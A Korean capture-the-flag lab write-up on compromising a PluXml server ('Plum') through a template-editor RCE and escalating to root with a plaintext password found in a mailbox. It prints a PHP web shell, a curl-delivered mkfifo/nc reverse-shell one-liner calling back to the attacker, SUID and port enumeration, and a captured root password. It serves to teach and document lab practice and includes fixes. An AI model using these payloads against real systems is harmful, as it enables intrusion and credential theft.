파일 타임스탬프도 일치함. `pluxml.py` 는 클론 시각(12:56:42)에서 변하지 않았고 디렉터리 mtime 만 9초 뒤(12:56:51)로 갱신됨 — `vi` 가 같은 디렉터리에 스왑 파일을 만들었다 지우면서 디렉터리 mtime 만 건드린 흔적임(저장소 `.gitignore` 에 `*.swp` 가 있는 것과 정합).

즉 기본값 `/usr/bin/bash` 가 그대로 통함. Debian 11 은 usr-merge 가 적용돼 `/bin` 이 `/usr/bin` 심볼릭 링크이므로 `/usr/bin/bash` 가 존재함. **[가정]** usr-merge 이전 시스템(Debian 9 이하 등)이었다면 `/usr/bin/bash` 가 없어 리버스셸이 조용히 실패했을 것이고, 저자의 경고가 그것을 겨냥한 것으로 봄.

**익스플로잇 확보**

```bash
┌──(kali㉿kali)-[~/PG/plum]
└─$ git clone https://github.com/erlaplante/pluxml-rce.git
Cloning into 'pluxml-rce'...
remote: Enumerating objects: 5, done.
remote: Counting objects: 100% (5/5), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 5 (delta 0), reused 5 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (5/5), done.

┌──(kali㉿kali)-[~/PG/plum]
└─$ ls
nmap.log  pluxml-rce

┌──(kali㉿kali)-[~/PG/plum]
└─$ cd pluxml-rce

┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]
└─$ ls
pluxml.py  README.md

┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]
└─$ vi pluxml.py

┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]
└─$ python pluxml.py
[-] Usage:   pluxml.py <URL> <UserName> <Password> <RHOST> <RPORT>
[-] Example: pluxml.py http://example.com admin pass123 192.168.10.10 443
```

![[Pasted image 20260629125838.png]]
![[Pasted image 20260629125852.png]]

남의 익스플로잇은 실행 전에 읽음. 최소한 셋은 확인할 것 — 어디로 요청을 보내는가(엔드포인트·메서드), 성공을 어떻게 판정하는가(판정이 없으면 던지기만 하는 도구임), 내 쪽 설정이 필요한가(리스너·아웃바운드·경로). `pluxml.py` 는 셋 다 명확함. 위 기록의 `vi pluxml.py` 가 그 확인임.

**실행** — 리스너를 먼저 띄움.

```bash
┌──(kali㉿kali)-[~/PG/plum]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
```

```bash
┌──(kali㉿kali)-[~/PG/plum/pluxml-rce]
└─$ python pluxml.py http://192.168.132.28/ admin admin 192.168.45.156 4444
[+] Attempting login...
[+] Successfully logged in as: admin
[+] Attempting to modify template...
[+] Attemtping to save template...
[+] Check your listener...
```

![[Pasted image 20260629125932.png]]
![[Pasted image 20260629125939.png]]
![[Pasted image 20260629130002.png]]

| 인자 | 값 | 주의점 |
|---|---|---|
| URL | `http://192.168.132.28/` | 스킴 필수. 스크립트가 이 문자열을 경로와 그대로 이어 붙인다 |
| UserName / Password | `admin` / `admin` | `Service Enumeration` 에서 확인한 기본 자격증명 |
| RHOST | `192.168.45.156` | 칼리 `tun0` IP. VPN 재접속마다 바뀐다 — `ip -br a` 로 확인 |
| RPORT | `4444` | 리스너 포트와 일치 |

`[+] Successfully logged in as: admin` 은 실제 판정임. 이 스크립트는 [[pyLoader]] 의 `51532.py` 와 달리 응답 본문을 확인함.

```python
auth_failed = 'Incorrect login or password'
if auth_failed in r.text:
    sys.exit('[-] Error: ' + auth_failed)
```

반면 마지막 줄 `[+] Check your listener...` 는 **아무것도 판정하지 않음** — 요청을 보냈다는 사실만 알려줌. 판정 근거는 리스너 쪽임.

**⚠️ 수동 대안 — 스크립트 없이 브라우저로**

시험 관점에서 이 박스는 자동 도구가 전혀 필요 없음. `sqlmap`(명시적 금지)도 Metasploit(1대 한정)도 쓰지 않았음. `pluxml.py` 는 자동 익스플로잇 프레임워크가 아니라 HTTP 요청 3개를 순서대로 보내는 스크립트이고 그 3개는 브라우저로 손수 할 수 있음. 스크립트가 깨질 때의 생명줄임.

1. `http://TARGET/core/admin/auth.php` 에서 `admin`/`admin` 로그인
2. 관리 메뉴 → Display settings → Themes (또는 직접 `http://TARGET/core/admin/parametres_edittpl.php`)
3. 편집기에서 `static.php` 를 선택하고 Load
4. 내용 끝에 웹셸 한 줄 추가 후 Save the file:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
5. `curl` 로 명령 실행 — 리버스셸 전에 실행 여부부터 확인:
   ```bash
   curl -s --get --data-urlencode 'cmd=id' 'http://TARGET/index.php?static1/static-1'
   ```
6. 확인되면 리버스셸:
   ```bash
   curl -s --get --data-urlencode 'cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/usr/bin/bash -i 2>&1|nc LHOST 4444 >/tmp/f' \
     'http://TARGET/index.php?static1/static-1'
   ```

**curl 플래그 해설**

| 플래그 | 역할 | 빼면 어떻게 되는가 |
|---|---|---|
| `--get` | `--data-*` 로 만든 본문을 GET 쿼리스트링으로 보낸다 | 웹셸이 `$_GET['cmd']` 를 읽으므로 POST로 보내면 아무 일도 일어나지 않는다 |
| `--data-urlencode` | 값을 자동 URL 인코딩 | `;`·`&`·`|`·공백이 그대로 나가면 쿼리스트링이 잘려 명령이 반쪽만 실행된다. `&` 가 특히 그렇다 |
| `-s` | 진행률 억제 | 출력이 지저분해진다 |

⚠️ `--data-urlencode` 를 쓸 때는 값이 아직 인코딩되지 않은 raw 문자열이어야 함. **이미 `%20` 이 들어 있으면 `%2520` 으로 이중 인코딩됨** — [[pyLoader]] 에서 `--data-binary` 를 써야 했던 것과 정반대 상황이라 둘의 차이를 헷갈리지 말 것.

**셸 획득 — `www-data`**

```bash
┌──(kali㉿kali)-[~/PG/plum]
└─$ rlwrap nc -lnvp 4444
listening on [any] 4444 ...
connect to [192.168.45.156] from (UNKNOWN) [192.168.132.28] 59858
bash: cannot set terminal process group (731): Inappropriate ioctl for device
bash: no job control in this shell
www-data@plum:/var/www/html$ whoami
whoami
www-data
www-data@plum:/var/www/html$ cd
cd
bash: cd: HOME not set
www-data@plum:/var/www/html$ cd /home
cd /home
www-data@plum:/home$
```

![[Pasted image 20260629130031.png]]

`bash: cannot set terminal process group` · `bash: no job control in this shell` · `bash: cd: HOME not set` 은 웹서버 자식 프로세스의 전형적 증상임. Apache 가 띄운 프로세스는 `HOME` 환경변수를 물려받지 않아 인자 없는 `cd` 가 실패함. **이 세 줄이 「PTY 없는 셸」의 실측 근거**이기도 함(`Privilege Escalation` 절의 `su` 판정에서 다시 씀).

셸을 잡자마자 정리해두는 편이 나음.

```bash
export HOME=/tmp; export TERM=xterm; export PATH=$PATH:/usr/sbin:/sbin
```

`/usr/sbin:/sbin` 추가가 중요함. `netstat`·`ss`·`iptables` 같은 열거 도구가 거기 있어서, 없으면 **「command not found」를 도구 부재로 오해함.**

**플래그 — `/var/www/local.txt`**

```bash
www-data@plum:/tmp$ cd /var/www
cd /var/www
www-data@plum:/var/www$ ls
ls
html
local.txt
www-data@plum:/var/www$ cat local.txt
cat local.txt
26780c227fb20c4d1eb303a7536de3bd
```

![[Pasted image 20260629140858.png]]

`local.txt` 가 `/home/*/` 에 없는 것은 일반 사용자 계정이 없기 때문임. 셸을 잡은 계정이 `www-data`(서비스 계정)이라 홈 디렉터리가 없고, 그래서 랩 제작자가 www-data 가 읽을 수 있는 곳 — 웹 루트의 부모인 `/var/www/` — 에 둠. [[Squid]] 에서도 플래그가 `C:\local.txt` 에 있었음.

**Local.txt value:**
`26780c227fb20c4d1eb303a7536de3bd`

⚠️ 증거는 셸 세션 화면 `Pasted image 20260629140858.png` 이고 `whoami; hostname; hostname -I; date` 를 한 화면에 묶은 시험 증거 형식으로는 찍지 않았음(관측 없음). 대화형 셸에서 읽었다는 근거는 타겟 pty 프롬프트 `www-data@plum:/var/www$` 임.

### Privilege Escalation – 서비스 계정 메일함의 root 평문 자격증명 재사용

**Vulnerability Explanation:**
- root 가 `www-data` 앞으로 보낸 메일 본문에 **시스템 root 비밀번호가 평문**으로 적혀 있음. 파일은 `/var/spool/mail/www-data` 이고 소유자가 `www-data` 라 셸 계정이 그대로 읽음
- 그 비밀번호가 시스템 root 계정에 그대로 유효 — 평문 저장 + 자격증명 재사용이 겹쳐 `su -` 한 번으로 권한상승
- SUID `exim4` 는 경로가 아님. 타겟 Exim 은 **4.94.2** 로 CVE-2019-10149 취약 범위(4.87–4.91) 밖임

**Vulnerability Fix:**
- 비밀번호를 평문으로 전달하지 않을 것. 불가피하면 1회용 채널 + 즉시 변경
- 파일 소유자가 `www-data` 인 것은 구조상 정상이므로 **「서비스 계정 메일함에 민감정보를 넣지 않는다」가 유일한 통제**임
- root 를 비밀번호 기반 로그인 대상으로 두지 않을 것 — `PermitRootLogin no` + `sudo` 기반 운영 + `/etc/pam.d/su` 에 `pam_wheel.so` 로 `su` 사용 그룹 제한
- `www-data` 의 셸을 `/usr/sbin/nologin` 으로. `mod_php` 대신 php-fpm + 별도 계정 격리
- 탐지 — `sudo` 실패·템플릿 파일 변경·신규 `/tmp` 실행 파일이 전부 관측 가능한 신호였음. `themes/` 에 파일 무결성 모니터링(AIDE)을 걸면 웹셸 기록 즉시 알림

**Severity:** Critical — 평문 자격증명 재사용으로 즉시 root

**Steps to reproduce the attack:**
1. `export HOME=/tmp; export PATH=$PATH:/usr/sbin:/sbin` 로 웹서버 자식 셸 환경 정리
2. `find / -perm -u=s` 로 SUID 열거 — 배포판 비기본 항목은 `exim4` 하나
3. `netstat -tulpn` 으로 루프백 `127.0.0.1:25` 확인 → 로컬 MTA 가동
4. `/var/spool/mail/www-data` 를 읽어 root 평문 비밀번호 회수
5. 같은 메일 헤더의 `Exim 4.94.2` 로 CVE-2019-10149 비취약 확정
6. `su -` 로 root 전환 후 `/root/proof.txt`

**SUID 열거**

```bash
find / -perm -u=s 2>/dev/null
/usr/sbin/exim4
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/chfn
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/sudo
```
![[Pasted image 20260629142105.png]]

목록 대부분은 노이즈임.

| 항목 | 판정 |
|---|---|
| `chsh`·`chfn`·`passwd`·`gpasswd`·`newgrp`·`su`·`sudo`·`mount`·`umount`·`fusermount` | Debian 기본 SUID. 전부 정상이며 그 자체로는 경로가 아니다 |
| `dbus-daemon-launch-helper`·`ssh-keysign`·`polkit-agent-helper-1` | 역시 기본 구성 |
| `/usr/bin/pkexec` | CVE-2021-4034(PwnKit) 대상이었다. **[가정]** Debian 11 + Apache 2.4.56(2023년 빌드) 조합이면 2022년 1월 패치가 이미 반영돼 있을 것이다. 이 박스에서는 시도하지 않았다 |
| ★ `/usr/sbin/exim4` | 비기본 항목이자 유일하게 눈에 띄는 것. 여기로 갔고 실패함 — 타겟이 4.94.2 라 CVE-2019-10149 비취약(같은 절 메일 헤더가 근거) |

SUID 목록에서 신호와 노이즈를 가르는 기준은 「이 배포판 기본 설치에 원래 있는가?」 하나면 됨. 위 목록에서 기본이 아닌 것은 `exim4` 하나임. 기본 목록을 외우기 어렵다면 반대로 GTFOBins 에 있는 이름이 보일 때 표시하는 방법도 있음 — `find`·`vim`·`nano`·`python`·`perl`·`awk`·`less`·`more`·`nmap`·`tar`·`zip`·`bash`·`cp`·`env`. **이 박스에는 GTFOBins 항목이 하나도 없었고 그 사실 자체가 「SUID 는 길이 아니다」라는 신호였음.**

**리스닝 포트 — 여기에 진짜 단서가 있었다**

```bash
netstat -tulpn
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
tcp6       0      0 ::1:25                  :::*                    LISTEN      -
```

![[Pasted image 20260629142834.png]]

`127.0.0.1:25` 는 nmap 이 볼 수 없었던 서비스임. 외부 스캔에는 22/80 만 보였는데 루프백 전용 바인드는 원격 스캔에 원리적으로 안 잡힘. **셸을 잡으면 반드시 다시 열거할 것.**

```bash
ss -lntup            # 또는 netstat -tulpn
```

25번(SMTP)이 보이는 순간 로컬 MTA 가 돈다는 것(Information 화면의 `Mail sending function available` 과 일치)과 메일함이 존재한다는 것이 함께 확정됨. `/var/spool/mail/` 을 봐야 한다는 뜻이고 그것이 정답이었음.

**메일함에서 root 자격증명**

> [!warning] 근거 등급 — `cd` 까지는 실측, `ls -al` 출력부터는 [가정]
> `netstat` 스크린샷(`…142834.png`)의 마지막 줄이 **`cd /var/spool/mail`** 이므로 거기까지는 실측임. 그러나 다음 스크린샷(`…142856.png`)은 **메일 본문의 `Return-path:` 부터** 시작함 — 그 사이의 `ls` · `ls -al` · `cat www-data` 명령줄과 mbox 첫 줄(`From root@localhost Fri Aug 25 …`)은 화면에 없음.
> 아래 `ls -al` 블록의 출처는 **초판 노트에 붙여넣은 터미널 전사**(볼트 git 최초 스냅샷에 보존)임. 화면 사진으로 교차 검증되지 않으므로 **[가정]** 등급으로 읽되, 지어낸 것이 아니라 별도 매체에 남은 동시대 기록임.
> 반면 **메일 본문 블록은 스크린샷과 한 글자까지 일치함**(오탈자 `sophisicated`, 제목 끝의 군더더기 `"` 포함) — 실측임.

```bash
cd /var/spool/mail
ls
www-data
cd www-data
/tmp/pwned: 8: cd: can't cd to www-data
ls
www-data
whoami
www-data
ls -al
total 16
drwxrwsr-x  2 root     mail 4096 Jun 29 01:12 .
drwxr-xr-x 12 root     root 4096 Aug 25  2023 ..
-rw-rw----  1 www-data mail 4528 Jun 29 01:12 www-data
cat www-data
```

⚠️ 이 전사에 설명되지 않는 줄이 하나 섞여 있음 — `cd www-data` 의 에러 접두사가 `bash:` 가 아니라 **`/tmp/pwned:`** 임. 당시 셸이 실패한 exim 익스플로잇이 남긴 `/tmp/pwned` 였다는 뜻이고, 「남긴 흔적」 절의 판정 근거가 이 한 줄임.

![[Pasted image 20260629142856.png]]

**파일 소유자가 `www-data`** 라 읽을 수 있음. 내용:

```text
From root@localhost Fri Aug 25 06:31:47 2023
Return-path: <root@localhost>
Envelope-to: www-data@localhost
Delivery-date: Fri, 25 Aug 2023 06:31:47 -0400
Received: from root by localhost with local (Exim 4.94.2)
        (envelope-from <root@localhost>)
        id 1qZU6V-0000El-Pw
        for www-data@localhost; Fri, 25 Aug 2023 06:31:47 -0400
To: www-data@localhost
From: root@localhost
Subject: URGENT - DDOS ATTACK"
Reply-to: root@localhost
Message-Id: <E1qZU6V-0000El-Pw@localhost>
Date: Fri, 25 Aug 2023 06:31:47 -0400

We are under attack. We've been targeted by an extremely complicated and sophisicated DDOS attack. I trust your skills. Please save us from this. Here are the credentials for the root user:
root:6s8kaZZNaZZYBMfh2YEW
Thanks,
Administrator
```

**`root : 6s8kaZZNaZZYBMfh2YEW`** — 평문임.

**메일함에는 이 메일 하나만 있는 것이 아님.** 4528바이트 안에 mbox 메시지가 셋 들어 있고, 뒤의 둘은 **공격자 자신이 만든 것**임 — `www-data` 로 친 `sudo` 가 비밀번호 프롬프트에서 실패했고 그 보안 경고 메일이 root 앞으로 발송됐다가 배달 실패해 반송본이 발신자(`www-data`) 메일함에 쌓임.

```text
X-Failed-Recipients: debian@localhost
...
  debian@localhost
    (generated from root@localhost)
    Unrouteable address
...
localhost : Jun 29 04:57:06 : www-data : 1 incorrect password attempt ; PWD=/tmp ; USER=root ; COMMAND=list
...
localhost : Jun 29 05:12:46 : www-data : 1 incorrect password attempt ; PWD=/tmp ; USER=root ; COMMAND=list
```
— 출처: 같은 `cat www-data` 전사의 후반부(초판 노트에 보존). `...` 는 발췌 표시임.

읽는 법이 셋 나옴.
- `COMMAND=list` = `sudo -l` 임. 즉 `sudo -l` 을 두 번 쳤고 `www-data` 에 비밀번호가 없어 둘 다 실패함 — **`sudo` 는 이 박스의 경로가 아니었음.**
- `root@localhost` 가 `debian@localhost` 로 별칭 전개되는데 그런 로컬 계정이 없어 `Unrouteable address` 로 반송됨. **관리자에게 갈 경고가 대신 공격자에게 배달된 셈**임.
- 두 시각은 `sudo` 가 남긴 UTC 이고 타겟 로컬(EDT, `-0400`)로는 00:57:06 · 01:12:46 임. 두 번째가 메일함 mtime `Jun 29 01:12` 과 일치해 **파일 시각의 출처를 확정해줌.**

그리고 이 메일 헤더에 Exim 버전이 적혀 있음.

```text
Received: from root by localhost with local (Exim 4.94.2)
```

**`Exim 4.94.2`** 임. CVE-2019-10149 의 취약 범위는 4.87~4.91 이므로 **이 한 줄만 읽었어도 exim 익스플로잇이 무의미하다는 것을 알 수 있었음.** 실제 진행 순서는 exim 익스플로잇(exploit-db `46996` = `raptor_exim_wiz`)을 먼저 확보해 실패한 뒤 메일함을 본 것임 — 그 시행착오의 복원은 [[_PLAYBOOK]].

⚠️ 4.94.2 자체가 보안 수정 릴리스임 — 2021-05-04 공개된 21Nails 묶음(CVE-2020-28007~28026 + CVE-2021-27216, 21건)의 수정본이고 Debian 11 의 exim4 패키지가 `4.94.2-7+deb11u*` 계열인 것도 그 때문임. **`4.94.2` 라는 숫자를 보면 CVE-2019-10149 도 21Nails 도 둘 다 배제해야 함.**

버전 정보는 예상 밖의 곳에 있음 — 메일 헤더·HTTP 응답 헤더·에러 페이지·`--version`·패키지 DB(`dpkg -l | grep exim`)·`/usr/share/doc/<pkg>/changelog.Debian.gz`.

**자격증명 재사용 → root**

```bash
su -
Password: 6s8kaZZNaZZYBMfh2YEW
whoami
root
cat /root/proof.txt
b0d62860a794cb90eb6ac02cee93c579
```

![[Pasted image 20260629142947.png]]

**`su` 는 TTY 없이도 동작함.** *"`su: must be run from a terminal` 은 비밀번호 오류가 아니다. 순수 리버스셸에서는 `su` 가 아예 동작하지 않는다"* 로 외워두기 쉬우나 틀림. Kali 실측(TTY 없음):

```bash
ssh kali@10.44.44.128 "setsid sh -c 'echo wrongpw | su root' < /dev/null; su --version; strings \$(readlink -f /bin/su) | grep -i 'must be run from a terminal'"
```

```text
Password: su: Authentication failure
su from util-linux 2.41.2
```

TTY 없이도 `su` 가 비밀번호를 읽어 **인증 실패까지 도달함**(= 동작함). 그리고 `strings` 는 아무것도 출력하지 않음 — **`must be run from a terminal` 이라는 문구는 `su` 바이너리에 존재하지 않음.** 비대화형 `ssh` 호출이라 이 박스에서 관측된 것이 아니라 사후 재현임.

util-linux `su` 는 TTY 가 없으면 stdin 에서 비밀번호를 읽음. Debian 11 의 `su` 도 util-linux 제공임. 그 문구를 내는 것은 `su` 가 아니라 `sudo` 임.

**이 박스가 PTY 없는 셸이었다는 근거**는 `Initial Access` 절 셸 획득 시점의 `bash: cannot set terminal process group` · `bash: no job control in this shell` 와 PTY 승격 기록 부재임.

⚠️ **화면에 비밀번호가 평문으로 찍힌 것(`…142947.png`)은 TTY 부재의 증거가 «아님».** `rlwrap nc` 리스너 쪽 로컬 터미널의 타이핑 에코로 설명되므로 타겟 측 TTY 유무를 가리지 못함. 이 구분은 [[_PLAYBOOK#A-3-10. `su` 가 `must be run from a terminal` 로 거부된다 — 그러나 «항상» 그런 것은 아니다]].

단서 하나 — `su` 가 TTY 를 요구하는 구성이 아예 없지는 않아서 PAM 설정(`pam_securetty` 등)이나 `su` 대체 구현에서는 거부될 수 있음. 그러나 기본 동작은 stdin 읽기임. `sudo` 는 별개고 `Defaults requiretty` 가 있으면 실제로 거부되니 **`su` 와 `sudo` 를 한 문장에 묶지 말 것.** TTY 를 올리는 것 자체는 여전히 좋은 습관임(Ctrl+C·탭 완성·`vi`).

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 또는
script -qc /bin/bash /dev/null
```

`su` 와 `su -` 의 차이도 짚어둠. `su root` 는 환경을 물려받아 `PWD` 가 그대로이고 `PATH` 도 www-data 것임. `su -` 는 로그인 셸이라 `/root` 로 이동하고 `PATH`·`HOME`·프로필이 root 것으로 새로 섬. 이 박스에서는 `HOME` 이 아예 설정돼 있지 않았고 `su -` 가 그것을 한 번에 정리해줌.

평문 비밀번호를 하나 주우면 전면 재사용 시험을 함.

```text
① su -                     ← root부터. 성공하면 나머지가 필요 없다
② su <각 로컬 계정>         ← /etc/passwd 에서 UID>=1000 목록
③ ssh <계정>@localhost      ← 로컬 셸이 있으면 su가 우선이지만, 안정된 TTY가 필요하면 ssh
④ 다른 웹 패널 / DB / 서비스
```

**`su` 가 SSH 보다 우선임.** SSH 는 `PermitRootLogin`·`AllowUsers` 에 막힐 수 있고 그 거부를 「비밀번호 틀림」으로 오독하기 쉬움. 누적 패턴 — [[Codo]] · [[Scarlet]] · [[Zipper]].

### Post-Exploitation

**Proof.txt value:**
`b0d62860a794cb90eb6ac02cee93c579`

⚠️ 증거는 `Pasted image 20260629142947.png` 한 장(`su -` → `whoami` → `root` → `cat /root/proof.txt` 가 한 화면). `hostname`·`hostname -I`·`date` 를 함께 묶은 시험 증거 형식으로는 찍지 않았음(관측 없음).

**남긴 흔적**

- ★ `themes/<style>/static.php` 덮어씀. 웹셸 `<?php system($_GET['cmd']); ?>` 이 포함된 상태로 남아 있음. **원본 복원 또는 랩 리버트 필요**
- ★ `/tmp/pwned` · `/tmp/pwned.c` — 실패한 exim 익스플로잇(`raptor_exim_wiz`)의 잔여물. **[가정]** `/tmp/pwned` 는 `/bin/sh` 사본이고 setuid 가 걸리지 않은 것으로 봄 — 근거는 리버스셸 전사에 남은 에러 접두사(`/tmp/pwned:`)와 그 뒤의 `whoami` → `www-data` 임. **`ls -l /tmp/pwned` 를 직접 찍지 않았으므로 확정은 아님**
- `/tmp/f` — 리버스셸용 명명 파이프. 남아 있으면 재접속 시 `mkfifo` 가 실패함
- 로그: `sudo -l` 실패 2건(04:57:06, 05:12:46 UTC = 타겟 로컬 00:57, 01:12 EDT)이 `mail_badpass` 가 켜져 있어 root 앞 경고 메일을 생성했고(`sudoers(5)` 기본값은 OFF), root 별칭이 `debian@localhost` 로 전개돼 `Unrouteable address` 로 반송되면서 `/var/spool/mail/www-data` 가 갱신됨(mtime `Jun 29 01:12`). 반송 경로는 추정이 아니라 메일함 전사에 그대로 남아 있음(같은 절 발췌)
- 획득 자격증명: PluXml 관리자 `admin` / `admin` · 시스템 **`root` / `6s8kaZZNaZZYBMfh2YEW`**

## 관련

**1차 사료** — 아래에서 직접 확인함.

- CVE-2024-48138 — `parametres_edittpl.php` 템플릿 편집기 RCE (≤ 5.8.16). **이 박스에서 실제로 악용한 결함**
- CVE-2022-25018 — <https://nvd.nist.gov/vuln/detail/CVE-2022-25018> · 정적 페이지(`statique.php`/`editStatique`) RCE, manager 권한, CVSS 8.8, CWE-94. 익스플로잇 README 가 인용하지만 실제 경로와 다름
- 발견자 원 보고서(Moritz Huppert): <https://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf>
- CVE-2024-22636 — 정적 페이지 RCE 재발 (5.8.9)
- PluXml 소스: <https://github.com/pluxml/PluXml> · `core/admin/parametres_edittpl.php` · `core/lib/class.plx.utils.php`(`write()`) · `core/lib/class.plx.token.php`
- 정적 페이지 패치와 되돌림: `15170a27`(2022-04-27 `sanitizePhpTags()`) → `374a401b`(2022-08-01 Revert)
- CVE-2019-10149 — Qualys 원 어드바이저리: <https://www.qualys.com/2019/06/05/cve-2019-10149/return-wizard-rce-exim.txt> · 취약 4.87–4.91, 4.92 에서 수정
- Exim 공식 스펙 "Security considerations" — 배달 프로세스가 root 를 유지하는 근거: <https://www.exim.org/exim-html-current/doc/html/spec_html/ch-security_considerations.html>
- 21Nails 어드바이저리(CVE-2020-28007~28026 + CVE-2021-27216, CRD 2021-05-04): <https://www.exim.org/static/doc/security/CVE-2020-qualys/21nails.txt> — ⚠️ 이 문서는 `4.94.2` 를 언급하지 않음. 수정 릴리스가 4.94.2 라는 판정의 근거는 아래 둘임
- 4.94.2 릴리스 시각: ftp.exim.org 배포 디렉터리의 `exim-4.94.2.tar.xz  04-May-2021 13:35`(CRD 와 같은 날)
- 4.94.2 ChangeLog: <https://github.com/Exim/exim/blob/exim-4.94.2/doc/doc-txt/ChangeLog> — `Exim version 4.94.2` 절이 21Nails 항목(`CVE-2020-28016` 등)을 나열함

**도구·익스플로잇**

- PluXml RCE 익스플로잇(실제로 사용): <https://github.com/erlaplante/pluxml-rce>
- `raptor_exim_wiz`(exploit-db 46996, 시도했으나 실패): <https://www.exploit-db.com/exploits/46996>
- GTFOBins: <https://gtfobins.github.io/> — SUID 목록 판정용
- 리버스셸 원라이너: PayloadsAllTheThings — Reverse Shell Cheatsheet

**기법 카드 · 시행착오**

- [[_PLAYBOOK#B-1-37. 로그인 폼을 만나면 기본 자격증명이 1순위 — 제품별 기본값 표]] · [[_PLAYBOOK#B-1-36. 인증 후 파일 업로드 → RCE — 조건 셋과 업로드 경로 찾기]] · [[_PLAYBOOK#B-1-14. CSRF 벽은 토큰을 실시간 파싱해 넘는다]] — 진입 경로 카드
- [[_PLAYBOOK#B-6-12. 평문 비밀번호를 하나 주우면 「이 조직이 쓰는 비밀번호」로 취급한다]] · [[_PLAYBOOK#B-2-13. POP3 · IMAP (110 · 143) — 메일함은 셸이 아니라 «다음 자격증명이 평문으로 적혀 있는 곳»이다]] — 권한상승 경로 카드
- [[_PLAYBOOK#A-13. 익스플로잇을 던지기 전에 버전과 CVE 표기를 검증한다]] · [[_PLAYBOOK#A-14. 공개 PoC는 실행 전에 소스를 읽는다]] · [[_PLAYBOOK#A-12. 응답이 성공을 뜻하지 않는다]] — exim 오답 경로와 CVE 표기 정정
- [[_PLAYBOOK#A-41. 셸은 잡았는데 권한상승 실마리가 없다]] · [[_PLAYBOOK#A-44. 셸을 잡으면 `netstat -tulpn` 도 친다]] · [[_PLAYBOOK#A-3-10. `su` 가 `must be run from a terminal` 로 거부된다 — 그러나 «항상» 그런 것은 아니다]] · [[_PLAYBOOK#B-86. 타겟에 컴파일러가 없다 — C PoC 를 못 빌드한다]]
- [[_PLAYBOOK#A-64. 사후에 시간 서사를 복원하는 법 — mtime + 스크린샷 파일명]] — 이 박스의 타임라인 복원 방법

**관련 노트**

- [[_WRITEUP-STANDARD]] — 이 노트의 작성 기준
- [[pyLoader]] — 같은 날 푼 박스. 그쪽은 pre-auth 라 로그인이 불필요했고 곧바로 root 였음. 인증 필요 여부와 서비스 실행 계정이 난이도를 결정한다는 대비 사례. `--data-binary` ↔ `--data-urlencode` 의 구분도 양쪽을 함께 보면 명확해짐
- [[Codo]] — 평문 자격증명 재사용 → `su`, `su` vs `su -` 의 차이. 거의 같은 권한상승 구조
- [[Scarlet]] · [[Zipper]] — 누적 패턴 「평문 비밀번호를 주우면 전면 재사용 시험」
- [[Squid]] — 진단 스크립트가 정찰을 대신해준 같은 패턴(`phpsysinfo`·`testmysql.php`), CSRF 토큰 갱신 함정, 「인용이 깨지면 인코딩으로 도망간다」
- [[Muddy]] — Exim(25/tcp)이 등장하는 다른 박스
- [[Crane]] · [[RubyDome]] · [[Astronaut]] · [[Exghost]] · [[Hawat]] — 누적 패턴 「응답이 성공을 뜻하지 않는다」
- [[Hub]] · [[Levram]] — 누적 패턴 「버전 판정은 독립 근거 2개」
